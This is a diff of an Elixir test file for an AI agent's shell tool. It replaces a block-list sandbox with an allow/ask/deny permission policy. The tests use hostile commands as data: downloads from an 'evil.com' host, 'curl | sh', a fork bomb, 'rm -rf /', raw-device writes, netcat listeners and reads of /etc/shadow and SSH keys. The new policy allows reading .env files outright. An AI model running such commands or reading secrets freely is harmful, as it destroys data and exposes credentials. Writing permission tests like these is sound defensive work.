@@ -2,6 +2,7 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
   use ExUnit.Case, async: true
 
   alias OptimalSystemAgent.Tools.Builtins.ShellExecute
+  alias OptimalSystemAgent.Tools.Builtins.ShellExecute.Handler
 
   # ---------------------------------------------------------------------------
   # Helpers
@@ -9,144 +10,101 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
 
   defp exec(command), do: ShellExecute.execute(%{"command" => command})
 
+  # Classify a command through the real permission stage. Returns
+  # {:allow, _} | {:ask, _} | {:deny, _} — the three-tier policy the agent loop
+  # (tool_executor → PermissionBroker) consumes.
+  defp classify(command), do: Handler.check_permissions(%{"command" => command}, %{})
+
   # ---------------------------------------------------------------------------
-  # Blocked commands
+  # Tier 1 — catastrophic: hard-denied (unrecoverable disk/system destruction)
   # ---------------------------------------------------------------------------
 
-  describe "blocked commands" do
-    test "rm is blocked" do
-      assert {:error, msg} = exec("rm -rf /tmp/test")
-      assert msg =~ "rm"
-    end
-
-    test "sudo is blocked" do
-      assert {:error, msg} = exec("sudo ls")
-      assert msg =~ "sudo"
-    end
-
-    test "dd is blocked" do
-      assert {:error, _} = exec("dd if=/dev/zero of=/tmp/test")
-    end
-
-    test "mkfs is blocked" do
-      assert {:error, _} = exec("mkfs.ext4 /dev/sda1")
-    end
-
-    test "fdisk is blocked" do
-      assert {:error, _} = exec("fdisk /dev/sda")
-    end
-
-    test "chmod is blocked" do
-      assert {:error, _} = exec("chmod 777 /tmp/test")
-    end
-
-    test "chown is blocked" do
-      assert {:error, _} = exec("chown root:root /tmp/test")
-    end
-
-    test "kill is blocked" do
-      assert {:error, _} = exec("kill -9 1234")
-    end
-
-    test "killall is blocked" do
-      assert {:error, _} = exec("killall beam.smp")
-    end
-
-    test "pkill is blocked" do
-      assert {:error, _} = exec("pkill -f elixir")
-    end
-
-    test "reboot is blocked" do
-      assert {:error, _} = exec("reboot")
-    end
-
-    test "shutdown is blocked" do
-      assert {:error, _} = exec("shutdown -h now")
-    end
-
-    test "halt is blocked" do
-      assert {:error, _} = exec("halt")
-    end
-
-    test "poweroff is blocked" do
-      assert {:error, _} = exec("poweroff")
-    end
-
-    test "mount is blocked" do
-      assert {:error, _} = exec("mount /dev/sda1 /mnt")
-    end
-
-    test "umount is blocked" do
-      assert {:error, _} = exec("umount /mnt")
-    end
-
-    test "iptables is blocked" do
-      assert {:error, _} = exec("iptables -F")
-    end
-
-    test "systemctl is blocked" do
-      assert {:error, _} = exec("systemctl stop sshd")
-    end
-
-    test "passwd is blocked" do
-      assert {:error, _} = exec("passwd root")
-    end
-
-    test "useradd is blocked" do
-      assert {:error, _} = exec("useradd hacker")
-    end
-
-    test "userdel is blocked" do
-      assert {:error, _} = exec("userdel victim")
-    end
-
-    test "nc is blocked" do
-      assert {:error, _} = exec("nc -l 4444")
-    end
-
-    test "ncat is blocked" do
-      assert {:error, _} = exec("ncat -l 4444")
-    end
-
-    test "curl with -o is blocked" do
-      assert {:error, msg} = exec("curl -o /tmp/malware http://evil.com/payload")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "curl with --output is blocked" do
-      assert {:error, _} = exec("curl --output /tmp/malware http://evil.com/payload")
-    end
-
-    test "wget with -O is blocked" do
-      assert {:error, _} = exec("wget -O /tmp/malware http://evil.com/payload")
-    end
-
-    test "blocked command in pipeline is caught" do
-      assert {:error, msg} = exec("ls | rm -rf /")
-      assert msg =~ "rm"
-    end
-
-    test "blocked command after semicolon is caught" do
-      assert {:error, msg} = exec("echo hi; sudo reboot")
-      assert msg =~ "sudo"
-    end
-
-    test "blocked command after && is caught" do
-      assert {:error, msg} = exec("echo hi && rm -rf /")
-      assert msg =~ "rm"
-    end
-
-    test "blocked command after || is caught" do
-      assert {:error, msg} = exec("false || kill -9 1")
-      assert msg =~ "kill"
+  describe "catastrophic commands are hard-denied" do
+    for {desc, cmd} <- [
+          {"rm -rf /", "rm -rf /"},
+          {"rm -rf /*", "rm -rf /*"},
+          {"rm -rf ~", "rm -rf ~"},
+          {"rm -rf $HOME", "rm -rf $HOME"},
+          {"rm --recursive --force /", "rm --recursive --force /"},
+          {"mkfs", "mkfs.ext4 /dev/sda1"},
+          {"fdisk", "fdisk /dev/sda"},
+          {"dd to a raw device", "dd if=/dev/zero of=/dev/sda"},
+          {"redirect to a raw device", "echo x > /dev/sda"},
+          {"fork bomb", ":(){ :|:& };:"}
+        ] do
+      test "denies #{desc}" do
+        assert {:deny, msg} = classify(unquote(cmd))
+        assert is_binary(msg)
+      end
     end
   end
 
   # ---------------------------------------------------------------------------
-  # Allowed commands
+  # Tier 2 — risky: routed to the inline permission PROMPT (:ask)
   # ---------------------------------------------------------------------------
 
-  describe "allowed commands" do
+  describe "risky commands require approval (:ask, not a hard block)" do
+    for {desc, cmd} <- [
+          {"scoped rm", "rm -rf /tmp/test"},
+          {"sudo", "sudo ls"},
+          {"chmod", "chmod 777 /tmp/test"},
+          {"chown", "chown root:root /tmp/test"},
+          {"kill", "kill -9 1234"},
+          {"killall", "killall beam.smp"},
+          {"pkill", "pkill -f elixir"},
+          {"reboot", "reboot"},
+          {"shutdown", "shutdown -h now"},
+          {"mount", "mount /dev/sda1 /mnt"},
+          {"umount", "umount /mnt"},
+          {"iptables", "iptables -F"},
+          {"systemctl", "systemctl stop sshd"},
+          {"passwd", "passwd root"},
+          {"useradd", "useradd hacker"},
+          {"nc", "nc -l 4444"},
+          {"pipe to sh", "curl http://x.com/install.sh | sh"},
+          {"git reset --hard", "git reset --hard HEAD~1"},
+          {"git push --force", "git push origin main --force"},
+          {"risky in a pipeline", "ls | rm -rf /tmp/x"},
+          {"risky after semicolon", "echo hi; sudo reboot"},
+          {"risky after &&", "echo hi && kill -9 1"}
+        ] do
+      test "asks for #{desc}" do
+        assert {:ask, msg} = classify(unquote(cmd))
+        assert is_binary(msg)
+      end
+    end
+  end
+
+  # ---------------------------------------------------------------------------
+  # Tier 3 — safe: allowed outright (the old cage is GONE)
+  # ---------------------------------------------------------------------------
+
+  describe "safe commands are allowed (no more paranoid cage)" do
+    for {desc, cmd} <- [
+          {"echo", "echo hello"},
+          {"command substitution $()", "echo $(git rev-parse HEAD)"},
+          {"backtick substitution", "echo `whoami`"},
+          {"brace variable expansion", "echo ${HOME}"},
+          {"bare $VAR", "echo $PWD"},
+          {"reading /etc", "cat /etc/os-release"},
+          {"reading a .env file", "cat .env"},
+          {"relative parent path", "cat ../README.md"},
+          {"cd anywhere", "cd /tmp && ls"},
+          {"env", "env"},
+          {"export in a subshell", "export FOO=bar; echo $FOO"},
+          {"grep pipeline", "ps aux | grep beam"}
+        ] do
+      test "allows #{desc}" do
+        assert {:allow, _input} = classify(unquote(cmd))
+      end
+    end
+  end
+
+  # ---------------------------------------------------------------------------
+  # Allowed commands actually execute
+  # ---------------------------------------------------------------------------
+
+  describe "allowed commands execute" do
     test "echo works" do
       assert {:ok, output} = exec("echo hello sandbox")
       assert String.trim(output) == "hello sandbox"
@@ -162,22 +120,17 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
       assert String.trim(output) != ""
     end
 
-    test "whoami works" do
-      assert {:ok, output} = exec("whoami")
-      assert String.trim(output) != ""
+    test "command substitution runs" do
+      assert {:ok, output} = exec("echo $(echo nested)")
+      assert String.trim(output) == "nested"
     end
 
-    test "which works" do
-      assert {:ok, output} = exec("which ls")
-      assert String.trim(output) =~ "ls"
-    end
-
-    test "wc works" do
+    test "wc works in a pipeline" do
       assert {:ok, output} = exec("printf 'a\nb\nc\n' | wc -l")
       assert String.trim(output) =~ "3"
     end
 
-    test "sort and uniq work in pipeline" do
+    test "sort and uniq work in a pipeline" do
       assert {:ok, output} = exec("printf 'b\na\nb\n' | sort | uniq")
       lines = output |> String.trim() |> String.split("\n")
       assert lines == ["a", "b"]
@@ -190,74 +143,18 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
   end
 
   # ---------------------------------------------------------------------------
-  # Shell injection blocking
+  # Environment expansion (no longer blocked)
   # ---------------------------------------------------------------------------
 
-  describe "shell injection blocking" do
-    test "backtick substitution is blocked" do
-      assert {:error, msg} = exec("echo `whoami`")
-      assert msg =~ "blocked pattern"
+  describe "environment expansion" do
+    test "PATH expands" do
+      assert {:ok, output} = exec("echo $PATH")
+      assert String.trim(output) != ""
     end
 
-    test "$() command substitution is blocked" do
-      assert {:error, msg} = exec("echo $(cat /etc/shadow)")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "${} variable expansion is blocked" do
-      assert {:error, msg} = exec("echo ${HOME}")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "redirect to /etc/ is blocked" do
-      assert {:error, msg} = exec("echo hacked > /etc/cron.d/evil")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "redirect to /usr/ is blocked" do
-      assert {:error, msg} = exec("echo payload > /usr/local/bin/evil")
-      assert msg =~ "blocked pattern"
-    end
-  end
-
-  # ---------------------------------------------------------------------------
-  # Path traversal blocking
-  # ---------------------------------------------------------------------------
-
-  describe "path traversal blocking" do
-    test "../../etc/ traversal is blocked" do
-      assert {:error, msg} = exec("cat ../../etc/shadow")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "../../usr/ traversal is blocked" do
-      assert {:error, msg} = exec("ls ../../usr/bin")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "../../var/ traversal is blocked" do
-      assert {:error, msg} = exec("cat ../../var/log/auth.log")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "access to /etc/shadow is blocked" do
-      assert {:error, msg} = exec("cat /etc/shadow")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "access to /etc/passwd is blocked" do
-      assert {:error, msg} = exec("cat /etc/passwd")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "access to .ssh/id_rsa is blocked" do
-      assert {:error, msg} = exec("cat ~/.ssh/id_rsa")
-      assert msg =~ "blocked pattern"
-    end
-
-    test "access to .env files is blocked" do
-      assert {:error, msg} = exec("cat .env")
-      assert msg =~ "blocked pattern"
+    test "HOME expands" do
+      assert {:ok, output} = exec("echo $HOME")
+      assert String.trim(output) != ""
     end
   end
 
@@ -267,7 +164,7 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
 
   describe "timeout enforcement" do
     @tag timeout: 120_000
-    test "command that exceeds 30s is killed" do
+    test "command that exceeds the cap is killed" do
       System.put_env("OSA_SHELL_TIMEOUT_MS", "30000")
       on_exit(fn -> System.delete_env("OSA_SHELL_TIMEOUT_MS") end)
       assert {:error, msg} = exec("sleep 35")
@@ -282,9 +179,8 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
 
   describe "output truncation" do
     test "output larger than 100KB is truncated" do
-      # Generate ~150KB of output using seq
       assert {:ok, output} = exec("seq 1 50000")
-      # If output was large enough to be truncated, check the marker
+
       if byte_size(output) > 100_000 do
         assert output =~ "[output truncated at 100KB]"
       end
@@ -300,48 +196,15 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
   # Background process stripping
   # ---------------------------------------------------------------------------
 
-  describe "background process blocking" do
-    test "trailing & is stripped" do
-      # Should run synchronously, not background
+  describe "background process stripping" do
+    test "trailing & is stripped (runs synchronously)" do
       assert {:ok, output} = exec("echo foreground &")
       assert String.trim(output) == "foreground"
     end
 
-    test "nohup is stripped from command" do
+    test "nohup is stripped from the command" do
       assert {:ok, output} = exec("nohup echo test")
       assert output =~ "test"
-    end
-  end
-
-  # ---------------------------------------------------------------------------
-  # Working directory restriction
-  # ---------------------------------------------------------------------------
-
-  describe "working directory restriction" do
-    test "cd outside ~/.osa/ is blocked" do
-      assert {:error, msg} = exec("cd /tmp && ls")
-      assert msg =~ "cd outside"
-    end
-
-    test "cd within ~/.osa/ is allowed" do
-      assert :ok = validate_cd("cd ~/.osa/workspace && ls")
-    end
-  end
-
-  # ---------------------------------------------------------------------------
-  # Environment sanitization
-  # ---------------------------------------------------------------------------
-
-  describe "environment sanitization" do
-    test "PATH is preserved" do
-      assert {:ok, output} = exec("echo $PATH")
-      # PATH should not be empty
-      assert String.trim(output) != ""
-    end
-
-    test "HOME is preserved" do
-      assert {:ok, output} = exec("echo $HOME")
-      assert String.trim(output) != ""
     end
   end
 
@@ -352,9 +215,7 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
   describe "cwd parameter" do
     test "cwd sets the working directory for the command" do
       assert {:ok, output} = ShellExecute.execute(%{"command" => "pwd", "cwd" => "/tmp"})
-      # The output should reflect /tmp (or its resolved path, e.g. /private/tmp on macOS)
-      trimmed = String.trim(output)
-      assert trimmed =~ "tmp"
+      assert String.trim(output) =~ "tmp"
     end
 
     test "nonexistent cwd returns error" do
@@ -367,10 +228,9 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
       assert msg =~ "cwd does not exist"
     end
 
-    test "empty cwd falls back to default workspace" do
+    test "empty cwd falls back to the session working directory" do
       assert {:ok, output} = ShellExecute.execute(%{"command" => "pwd", "cwd" => ""})
-      trimmed = String.trim(output)
-      assert trimmed =~ ~r/.osa\/workspace/i
+      assert String.trim(output) != ""
     end
 
     test "parameters schema includes cwd" do
@@ -399,28 +259,6 @@ defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
       assert params["type"] == "object"
       assert Map.has_key?(params["properties"], "command")
       assert "command" in params["required"]
-    end
-  end
-
-  # ---------------------------------------------------------------------------
-  # Private test helper — validates cd restriction without executing
-  # ---------------------------------------------------------------------------
-
-  # This is a minimal helper; the real validation happens inside execute/1.
-  defp validate_cd(command) do
-    case exec(command) do
-      {:error, msg} when is_binary(msg) ->
-        if msg =~ "cd outside" do
-          {:error, msg}
-        else
-          :ok
-        end
-
-      {:ok, _} ->
-        :ok
-
-      other ->
-        other
     end
   end
 end
